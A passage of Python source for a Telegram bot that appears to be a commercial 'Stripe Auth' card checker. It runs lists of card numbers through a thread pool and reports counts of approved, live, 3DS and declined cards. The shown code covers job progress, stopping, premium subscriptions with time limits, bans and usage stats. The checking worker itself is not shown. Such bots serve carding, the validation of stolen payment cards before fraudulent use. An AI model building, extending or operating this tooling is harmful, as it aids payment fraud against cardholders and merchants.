            try: bot.edit_message_text(update_text, message.chat.id, prog_msg.message_id)
            except: pass

    try:
        with ThreadPoolExecutor(max_workers=12) as executor:
            for cc in ccs:
                if not ACTIVE_JOBS.get(job_id): break
                executor.submit(worker, cc)

        if not ACTIVE_JOBS.get(job_id):
            tt = round(time.time() - start_time, 1)
            p = (results["checked"] / total) * 100
            filled = int(p // 10)
            bar = "■" * filled + "□" * (10 - filled)
            if is_admin(user_id): is_p = " [ADMIN]"
            elif is_premium(user_id): is_p = " [PREMIUM]"
            else: is_p = " [FREE]"
            final_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n\n[{bar}] ({round(p, 1)}%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {results['checked']}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['approved']}\n𝗟𝗶𝘃𝗲       ↬ {results['live']}\n𝟑𝐃𝐒        ↬ {results['3ds']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['declined']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['error']}\n𝗧/𝗧        ↬ {tt}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗦𝘁𝗼𝗽𝗽𝗲𝗱.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
            try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
            except: pass
            return

        tt = round(time.time() - start_time, 1)
        if is_admin(user_id): is_p = " [ADMIN]"
        elif is_premium(user_id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        
        final_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n\n[■■■■■■■■■■] (100.0%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {results['checked']}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['approved']}\n𝗟𝗶𝘃𝗲       ↬ {results['live']}\n𝟑𝐃𝐒        ↬ {results['3ds']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['declined']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['error']}\n𝗧/𝗧        ↬ {tt}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
        try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
        except: pass
    finally:
        was_stopped = not ACTIVE_JOBS.get(job_id)
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)
        if was_stopped:
            try: bot.send_message(message.chat.id, f"[✓] 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 {job_id} 𝘀𝘁𝗼𝗽𝗽𝗲𝗱.")
            except: pass

@bot.message_handler(commands=['stop'])
def stop_job(message):
    user_id = message.from_user.id
    parts = message.text.split()
    
    if len(parts) > 1:
        jid = parts[1].upper()
    else:
        jid = USER_ACTIVE_JOB.get(user_id)
        if not jid:
            bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘀𝘁𝗼𝗽.")
            return

    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        bot.reply_to(message, f"[↻] 𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 {jid}... 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗿𝗲𝗮𝗱𝘀 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵.")
        if USER_ACTIVE_JOB.get(user_id) == jid:
            USER_ACTIVE_JOB.pop(user_id, None)
    else:
        bot.reply_to(message, f"[✗] 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 {jid} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        
        if is_premium(target_id):
            bot.reply_to(message, f"[✗] 𝗨𝘀𝗲𝗿 {target_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘀 𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻!")
            return
            
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        
        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Added
✗ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ↬ {duration.upper()}
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [PREMIUM]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 {duration.upper()}! 𝗘𝗻𝗷𝗼𝘆 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗵𝗲𝗰𝗸𝘀.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /addpremium <userid> <days>(1s,1m,1h,1d,lifetime)")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        
        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Removed
✗ 𝗥𝗲𝗮𝘀𝗼𝗻 ↬ Admin Action
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [FREE]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /rmpremium <userid>")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(BANNED_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Ban User
✗ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ↬ {dur_label}
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [BANNED]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝗳𝗼𝗿 {dur_label}. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻 𝗶𝗳 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗺𝗶𝘀𝘁𝗮𝗸𝗲.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /ban <userid> <duration>")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        
        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Unban User
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [FREE]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗯𝗮𝗻 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /unban <userid>")

@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        target_id = str(message.from_user.id)
        
        role = "[FREE]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        
        if is_admin(int(target_id)):
            role = "[ADMIN]"
            limit = PREMIUM_LIMIT
            expire_str = "Lifetime"
        else:
            with open(PREMIUM_FILE, 'r') as f:
                premiums = f.read().splitlines()
                for p in premiums:
                    if target_id in p:
                        role = "[PREMIUM]"
                        limit = PREMIUM_LIMIT
                        prts = p.split('|')
                        if len(prts) > 1:
                            exp = float(prts[1])
                            if exp == 0: expire_str = "Lifetime"
                            else:
                                if time.time() > exp:
                                    role = "[FREE]"
                                    limit = FREE_LIMIT
                                    expire_str = "Expired"
                                else:
                                    expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                        else: expire_str = "Lifetime"
                        break

        if is_admin(message.from_user.id): is_p = " [ADMIN]"
        elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
        else: is_p = " [FREE]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗨𝘀𝗲𝗿 𝗜𝗗 ↬ {target_id}
✗ 𝗥𝗮𝗻𝗸 ↬ {role}
✗ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ↬ {expire_str}
✗ 𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁 ↬ {limit}
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
    except:
        bot.reply_to(message, "[✗] 𝗘𝗿𝗿𝗼𝗿 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗶𝗻𝗳𝗼!")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    s = get_stats()
    
    with open(BANNED_FILE, 'r') as f: banned_count = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: premium_count = len(f.read().splitlines())
    
    s["premium_users"] = premium_count
    s["banned_users"] = banned_count
    save_stats(s)
    
    if is_admin(message.from_user.id): is_p = " [ADMIN]"
    elif is_premium(message.from_user.id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"

    res = f"""
𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬
━━━━━━━━━━━━━
✗ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↬ {s.get('approved', 0)}
✗ 𝐋𝐢𝐯𝐞 ↬ {s.get('live', 0)}
✗ 𝟑𝐃𝐒 ↬ {s.get('3ds', 0)}
✗ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 ↬ {premium_count}
✗ 𝗕𝗮𝗻𝗻𝗲𝗱 ↬ {banned_count}
✗ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀 ↬ {s['total_users']}
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
    bot.reply_to(message, res)

if __name__ == "__main__":
    print("𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...\n")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)
